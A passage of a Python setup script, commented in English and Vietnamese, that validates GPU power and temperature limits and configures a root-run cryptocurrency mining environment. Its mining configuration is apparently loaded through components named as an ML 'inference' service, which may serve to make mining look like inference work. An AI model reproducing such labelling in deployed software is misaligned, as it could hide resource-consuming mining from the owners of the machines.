            logger.error("❌ **Invalid `temperature_limits.gpu.max_celsius` value** (giá trị `temperature_limits.gpu.max_celsius` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (40-100°C).")
            sys.exit(1)
        else:
            logger.info(f"✅ **GPU temperature limit** (giới hạn nhiệt độ GPU – ngưỡng nhiệt GPU): {gpu_max_celsius}°C")

        # 12. **Check Total Power Consumption** (kiểm tra tổng tiêu thụ điện – validate total power)
        power_limits = environmental_limits.get('power_limits', {})
        total_power_max = power_limits.get('total_power_watts', {}).get('max')
        if total_power_max is None:
            logger.error("❌ **Missing `power_limits.total_power_watts.max`** (thiếu `power_limits.total_power_watts.max` – không có trường này).")
            sys.exit(1)
        if not isinstance(total_power_max, (int, float)) or not (100 <= total_power_max <= 400):
            logger.error("❌ **Invalid `power_limits.total_power_watts.max` value** (giá trị `power_limits.total_power_watts.max` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (100-400 W).")
            sys.exit(1)
        else:
            logger.info(f"✅ **Total power consumption limit** (giới hạn tổng tiêu thụ năng lượng – tổng công suất giới hạn): {total_power_max} W")

        # ✅ **CPU POWER CONFIGURATION REMOVED** (cấu hình điện CPU đã xóa) - **GPU-only mode** (chế độ chỉ GPU)
        # 13. **GPU Device Power only** (chỉ điện thiết bị GPU) **(CPU power configuration eliminated)** (cấu hình điện CPU đã loại bỏ)
        per_device_power_watts = power_limits.get('per_device_power_watts', {})
        
        # ✅ **CPU power validation removed for GPU-only processing** (xác thực điện CPU đã xóa cho xử lý chỉ GPU)
        if 'cpu' in per_device_power_watts:
            logger.info("⚠️ **CPU power configuration detected but ignored** (phát hiện cấu hình điện CPU nhưng bỏ qua – CPU power config skip) **(GPU-only mode)** (chế độ chỉ GPU – GPU-only mode)")

        per_device_power_gpu = per_device_power_watts.get('gpu')
        if per_device_power_gpu is None:
            logger.error("❌ **Missing `power_limits.per_device_power_watts.gpu`** (thiếu `power_limits.per_device_power_watts.gpu` – không có trường này).")
            sys.exit(1)
        if not isinstance(per_device_power_gpu, (int, float)) or not (10 <= per_device_power_gpu <= 250):
            logger.error("❌ **Invalid `power_limits.per_device_power_watts.gpu` value** (giá trị `power_limits.per_device_power_watts.gpu` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (10-250 W).")
            sys.exit(1)
        else:
            logger.info(f"✅ **GPU power consumption limit** (giới hạn tiêu thụ năng lượng GPU – công suất GPU giới hạn): {per_device_power_gpu} W")

        # 14. **Check Memory Limits** (kiểm tra giới hạn bộ nhớ – validate memory limits)
        memory_limits = environmental_limits.get('memory_limits', {})
        ram_percent_threshold = memory_limits.get('ram_percent_threshold')
        if ram_percent_threshold is None:
            logger.error("❌ **Missing `ram_percent_threshold`** (thiếu `ram_percent_threshold` – không có trường này) **in `environmental_limits.memory_limits`** (trong `environmental_limits.memory_limits`).")
            sys.exit(1)
        if not isinstance(ram_percent_threshold, (int, float)) or not (50 <= ram_percent_threshold <= 100):
            logger.error("❌ **Invalid `ram_percent_threshold` value** (giá trị `ram_percent_threshold` không hợp lệ – sai giá trị) **or not a number** (hoặc không phải số) (50-100%).")
            sys.exit(1)
        else:
            logger.info(f"✅ **RAM percent threshold limit** (giới hạn ngưỡng phần trăm RAM – ngưỡng RAM): {ram_percent_threshold}%")

        # 15. **Check GPU utilization thresholds** (kiểm tra ngưỡng sử dụng GPU – validate GPU utilization)
        gpu_util = environmental_limits.get('gpu_optimization', {}).get('gpu_utilization_percent_optimal', {})
        gpu_util_min = gpu_util.get('min')
        gpu_util_max = gpu_util.get('max')
        
        # **Check type (int/float) before comparison** (kiểm tra kiểu (int/float) trước khi so sánh – validate type first)
        if (not isinstance(gpu_util_min, (int, float)) or 
            not isinstance(gpu_util_max, (int, float)) or 
            not (0 <= gpu_util_min < gpu_util_max <= 100)):
            logger.error("❌ **Invalid GPU utilization (min, max) values** (giá trị GPU utilization (min, max) không hợp lệ – sai giá trị) **or not numbers** (hoặc không phải số). (0 <= min < max <= 100).")
            sys.exit(1)
        else:
            logger.info(f"✅ **Optimal GPU utilization limits** (giới hạn tối ưu GPU utilization – ngưỡng GPU sử dụng tối ưu): min={gpu_util_min}%, max={gpu_util_max}%")

        logger.info("✅ **Configuration files fully validated** (các tệp cấu hình đã được xác thực đầy đủ – config files validated OK).")
    except Exception as e:
        logger.error(f"❌ **Error during configuration validation** (lỗi trong quá trình xác thực cấu hình – lỗi validate config): {e}")
        sys.exit(1)

def setup_gpu_optimization(environmental_limits, logger):
    """
    **Setup GPU Optimization** (thiết lập tối ưu hóa GPU – setup GPU optimization)
    
    Thiết lập **GPU optimization** (tối ưu hóa GPU – cấu hình tối ưu GPU) 
    dựa trên **configured thresholds** (các ngưỡng đã cấu hình – threshold đã setup).
    
    Args:
        environmental_limits: **Environmental limits dict** (từ điển giới hạn môi trường)
        logger: **Logger instance** (thể hiện logger)
    """
    logger.info("ℹ️ [SETUP] GPU optimization orchestration is handled by ResourceManager; skipping in setup_env.py")
    return

# ✅ **CPU OPTIMIZATIONS REMOVED** (tối ưu hóa CPU đã xóa) - **Function eliminated for GPU-only mode** (hàm đã loại bỏ cho chế độ chỉ GPU)
# **All CPU governor, process limits, and performance tuning removed** (tất cả CPU governor, giới hạn process, và tinh chỉnh hiệu năng đã xóa)

def setup():
    """
    **Main Setup Function** (hàm thiết lập chính – main setup function)
    
    Hàm chính để **setup mining environment** (thiết lập môi trường khai thác – setup môi trường mining).
    Thực hiện toàn bộ quy trình **initialization** (khởi tạo – init) và **configuration** (cấu hình – config).
    """
    CONFIG_DIR = os.getenv('CONFIG_DIR', '/app/mining_environment/config')
    LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
    os.makedirs(LOGS_DIR, exist_ok=True)

    logger = setup_logging('setup_env', Path(LOGS_DIR) / 'setup_env.log', 'INFO')

    logger.info("🚀 **Starting cryptocurrency mining environment setup** (bắt đầu thiết lập môi trường khai thác tiền điện tử – starting crypto mining env setup).")

    system_params_path = os.path.join(CONFIG_DIR, 'system_params.json')
    environmental_limits_path = os.path.join(CONFIG_DIR, 'environmental_limits.json')
    resource_config_path = os.path.join(CONFIG_DIR, 'resource_config.json')

    # **Load configurations** (tải cấu hình – load config files)
    system_params = load_json_config(system_params_path, logger)
    environmental_limits = load_json_config(environmental_limits_path, logger)
    resource_config = load_json_config(resource_config_path, logger)

    # Apply auto defaults (85%) before validations to remove dependency on hard-coded defaults
    apply_auto_defaults(resource_config, environmental_limits, logger)

    # **Memory Configuration Validation** (xác thực cấu hình bộ nhớ – validate memory config)
    logger.info("🔍 **[SETUP] Starting memory configuration validation** (bắt đầu xác thực cấu hình bộ nhớ – starting memory config validation)...")
    try:
        validate_memory_config(resource_config, logger)
        logger.info("✅ **[SETUP] Memory configuration validation completed successfully** (xác thực cấu hình bộ nhớ hoàn thành thành công – memory config validation OK)")
    except (ValueError, SystemError) as e:
        logger.error(f"❌ **[SETUP] Memory configuration validation failed** (xác thực cấu hình bộ nhớ thất bại – memory config validation failed): {e}")
        logger.error("🚨 **[CRITICAL] System cannot start with invalid memory configuration** (hệ thống không thể khởi động với cấu hình bộ nhớ không hợp lệ – system can't start với memory config sai)")
        logger.error("💡 **[SOLUTION] Please fix memory settings in resource_config.json** (vui lòng sửa cài đặt bộ nhớ trong resource_config.json – fix memory settings trong file config)")
        sys.exit(1)
    except Exception as e:
        logger.error(f"❌ **[SETUP] Unexpected error during memory validation** (lỗi không mong muốn trong quá trình xác thực bộ nhớ – lỗi bất ngờ khi validate memory): {e}")
        sys.exit(1)
    
    # **Validate configurations** (xác thực cấu hình – validate configs)
    validate_configs(resource_config, system_params, environmental_limits, logger)

    # **Set environment variables from environmental_limits** (đặt biến môi trường từ environmental_limits – set env vars từ limits)
    setup_environment_variables(environmental_limits, logger)

    # ===== Runtime defaults for orchestration & coordination (ENV) =====
    # Provide sane defaults when not explicitly configured by deployment
    def _set_default_env(key: str, value):
        try:
            if os.getenv(key) in (None, ""):
                os.environ[key] = str(value)
                logger.info(f"✅ [SETUP] Default ENV set: {key}={value}")
        except Exception:
            pass

    # Coordination robustness
    _set_default_env('COORD_MAX_RETRIES', 3)        # số lần retry lấy tài nguyên GPU
    # **HASHRATE FIX: Optimized coordination delays** (tối ưu độ trễ coordination)
    _set_default_env('COORD_INITIAL_DELAY', 0.25)   # Reduced from 0.5s to 0.25s for faster startup
    _set_default_env('COORD_SEMAPHORE_TIMEOUT', 60) # Increased semaphore timeout to reduce bottlenecks
    _set_default_env('COORD_RETRY_DELAY', 0.05)     # Fast retry for handoff operations
    _set_default_env('COORD_BACKOFF', 1.5)          # hệ số backoff
    _set_default_env('COORD_OPTIONAL', 'true')      # cho phép tiếp tục tối ưu nếu coordination thất bại
    _set_default_env('COORD_GPU_MEMORY_PCT', '0.15')  # xin 15% GPU memory (chấp nhận 0.15 hoặc 15)

    # Multi-GPU behavior
    _set_default_env('ENABLE_DYNAMIC_BALANCING', 'true')  # bật cân bằng tải đa GPU
    # Safety defaults for power/utilization/clock behavior
    _set_default_env('ALLOW_UTIL_UNDER_80', '0')
    _set_default_env('ALLOW_CLOCK_LOCK', '0')
    _set_default_env('GPU_PRE_UNLOCK', '1')
    
    # **Configuration from InferenceConfigService** (cấu hình từ InferenceConfigService – config từ ml-inference service)
    try:
        inference_config = get_inference_config(process_info=None, logger=logger)
        if inference_config.validate_configuration():
            # **Set environment variables from inference_config** (đặt biến môi trường từ inference_config – set env vars từ inference config)
            env_vars = inference_config.get_environment_variables()
            for key, value in env_vars.items():
                os.environ[key] = value
                logger.info(f"✅ **Set environment variable** (đặt biến môi trường – set env var) {key}={value}")
            
            # ✅ **CPU OPTIMIZATION CALL REMOVED** (lời gọi tối ưu hóa CPU đã xóa) - **GPU-only processing** (xử lý chỉ GPU)
            logger.info("✅ **CPU optimization skipped** (bỏ qua tối ưu hóa CPU – skip CPU optimization) - **GPU processing mode active** (chế độ xử lý GPU đang hoạt động – GPU mode ON)")
        else:
            logger.warning("⚠️ **InferenceConfigService validation failed** (validation của InferenceConfigService thất bại – InferenceConfigService validate failed), **using default configuration** (sử dụng cấu hình mặc định – dùng config mặc định)")
    except Exception as e:
        logger.warning(f"⚠️ **Cannot load InferenceConfigService** (không thể tải InferenceConfigService – can't load InferenceConfigService): {e}")

    # Ensure GPU utilization ENV defaults to 95% targets when not provided
    try:
        if os.getenv('GPU_UTIL_MIN') in (None, ''):
            os.environ['GPU_UTIL_MIN'] = '0.95'
            logger.info("ℹ️ [AUTO] GPU_UTIL_MIN=0.95 (95%)")
        if os.getenv('GPU_UTIL_MAX') in (None, ''):
            os.environ['GPU_UTIL_MAX'] = '1.0'
            logger.info("ℹ️ [AUTO] GPU_UTIL_MAX=1.0 (100%)")
        if os.getenv('GPU_TARGET_UTIL') in (None, ''):
            os.environ['GPU_TARGET_UTIL'] = '0.95'
            logger.info("ℹ️ [AUTO] GPU_TARGET_UTIL=0.95 (95%)")
    except Exception:
        pass

    # ===== Pre-unlock GPU state before any optimization kicks in =====
    try:
        pre_unlock = os.getenv('GPU_PRE_UNLOCK', '1').lower() in ('1','true','yes')
        if pre_unlock:
            logger.info("🔓 [SETUP] Pre-unlocking GPU clocks/memory clocks before optimization")
            reset_gpu_state(logger)
    except Exception as _e:
        logger.debug(f"[SETUP] Pre-unlock skipped: {_e}")

    # **System configuration** (cấu hình hệ thống – config system) **(timezone, locale)** (múi giờ, locale)
    configure_system(system_params, logger)

    # **GPU optimization orchestration delegated to ResourceManager** (ủy quyền điều phối tối ưu GPU – ResourceManager đảm nhiệm)
    logger.info("ℹ️ [SETUP] Skipping GPU optimization orchestration here; handled by ResourceManager")

    # **Security configuration** (cấu hình bảo mật – config security)
    configure_security(logger)

    logger.info("✅ **Mining environment setup completed successfully** (môi trường khai thác đã được thiết lập hoàn chỉnh – mining env setup hoàn tất).")


if __name__ == "__main__":
    # **Ensure script runs with root privileges** (đảm bảo script chạy với quyền root – ensure root access)
    if os.geteuid() != 0:
        print("❌ **Script must be run with root privileges** (script phải được chạy với quyền root – cần quyền root).")
        sys.exit(1)

    setup()
